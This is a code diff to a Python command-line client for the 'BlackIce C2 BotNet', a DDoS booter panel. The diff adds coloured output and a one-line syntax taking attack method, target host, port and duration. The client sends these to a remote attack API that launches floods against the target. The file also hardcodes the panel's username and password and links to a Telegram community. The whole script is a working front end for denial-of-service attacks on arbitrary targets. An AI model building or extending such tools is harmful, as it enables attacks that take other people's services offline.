@@ -2,6 +2,14 @@ import os
 import time
 import requests
 
+# ANSI escape codes for color
+RESET = "\033[0m"
+BOLD = "\033[1m"
+WHITE = "\033[37m"
+BLUE = "\033[34m"
+BLACK = "\033[30m"
+RED = "\033[31m"
+
 # API credentials
 USERNAME = "Iamgeo1"
 PASSWORD = "5671"
@@ -22,66 +30,70 @@ def clear_screen():
 def display_menu():
     clear_screen()
 
-    # Title
-    print("BLACKICE C2 BotNet\n")
+    # Title in Blue
+    print(f"{BLUE}BLACKICE C2 BotNet\n{RESET}")
     
-    # Welcome box
-    print("+------------------------------------------+")
-    print("| Welcome to the BlackIce C2 BotNet       |")
-    print("| Powered by BlackIce API                 |")
-    print("+------------------------------------------+")
+    # Welcome box in Blue and White
+    print(f"{BLUE}+------------------------------------------+{RESET}")
+    print(f"{BLUE}| {WHITE}Welcome to the BlackIce C2 BotNet       {BLUE}|{RESET}")
+    print(f"{BLUE}| Powered by BlackIce API                 |{RESET}")
+    print(f"{BLUE}+------------------------------------------+{RESET}")
     print("\nJoin the community: https://t.me/BlackIceC2")
-    print("Copyright © 2025 BlackIce - All Rights Reserved")
-    print("Created by iamgeo1 & mzz")
+    print(f"{WHITE}Copyright © 2025 BlackIce - All Rights Reserved{RESET}")
+    print(f"Created by iamgeo1 & mzz")
     print("=" * 50)
 
 # Show help and display attack methods
 def show_help():
-    print("\n+------------------------ COMMANDS ------------------------+")
-    print("[help]   - Show this help message")
-    print("[clear]  - Clear the terminal screen")
-    print("[exit]   - Exit the program")
-    print("+---------------------------------------------------------+")
+    print(f"\n{BLUE}+------------------------ COMMANDS ------------------------+{RESET}")
+    print(f"{WHITE}[help]   - Show this help message{RESET}")
+    print(f"{WHITE}[clear]  - Clear the terminal screen{RESET}")
+    print(f"{WHITE}[exit]   - Exit the program{RESET}")
+    print(f"{BLUE}+---------------------------------------------------------+{RESET}")
 
-    print("\nAvailable Attack Methods:")
-    columns = 3
-    for i in range(0, len(ATTACK_METHODS), columns):
-        row = []
-        for j in range(columns):
-            if i + j < len(ATTACK_METHODS):
-                method = ATTACK_METHODS[i + j]
-                row.append(f"[{i + j + 1}] {method}")
-        print("   ".join(row))
+    print(f"\n{BLUE}Available Attack Methods:{RESET}")
+    for i, method in enumerate(ATTACK_METHODS, 1):
+        print(f"{WHITE}[{i}] {method}{RESET}")
 
-# Get user input
+# Get user input for attack
 def get_input():
     try:
-        command = input("[root@BlackIce] ~ ").strip().lower()
-        if command == 'help':
+        command = input(f"{BLACK}[root@BlackIce] ~ {RESET}").strip().lower()
+
+        # Exit command
+        if command == 'exit':
+            print(f"\n{RED}[!] Shutting down BlackIce...{RESET}")
+            exit()
+
+        # Help command
+        elif command == 'help':
             show_help()
+
+        # Clear screen command
         elif command == 'clear':
             clear_screen()
             display_menu()
-        elif command == 'exit':
-            print("\n[!] Shutting down BlackIce...")
-            exit()
-        else:
-            try:
-                choice = int(command)
-                if 1 <= choice <= len(ATTACK_METHODS):
-                    method = ATTACK_METHODS[choice - 1]
-                    host = input("\nTarget (IP/Host): ")
-                    port = input("Port: ")
-                    duration = input("Duration (seconds): ")
 
-                    print("\nLaunching attack...")
+        else:
+            # Attempt to split the command into components (attack method, host, port, duration)
+            parts = command.split()
+            if len(parts) == 4:
+                method = parts[0]
+                host = parts[1]
+                port = parts[2]
+                duration = parts[3]
+
+                # Check if method is valid
+                if method in ATTACK_METHODS:
+                    print(f"\n{BLUE}Launching attack...{RESET}")
                     send_attack(method, host, port, duration)
                 else:
-                    print("\nInvalid selection.")
-            except ValueError:
-                print("\nInvalid input.")
+                    print(f"\n{RED}Invalid attack method.{RESET}")
+            else:
+                print(f"\n{RED}Invalid input. Please provide method, host, port, and duration.{RESET}")
+
     except Exception as e:
-        print("\nError: {e}")
+        print(f"\n{RED}Error: {e}{RESET}")
 
 # Send attack request
 def send_attack(method, host, port, duration):
@@ -96,9 +108,9 @@ def send_attack(method, host, port, duration):
     response = requests.get(url)
 
     if response.status_code == 200:
-        print(f"\nBooted By BlackIce.... {host}:{port} using {method} for {duration} seconds!")
+        print(f"\n{BLUE}Booted By BlackIce.... {host}:{port} using {method} for {duration} seconds!{RESET}")
     else:
-        print(f"\nError: {response.text}")
+        print(f"\n{RED}Error: {response.text}{RESET}")
 
     time.sleep(3)
     main()
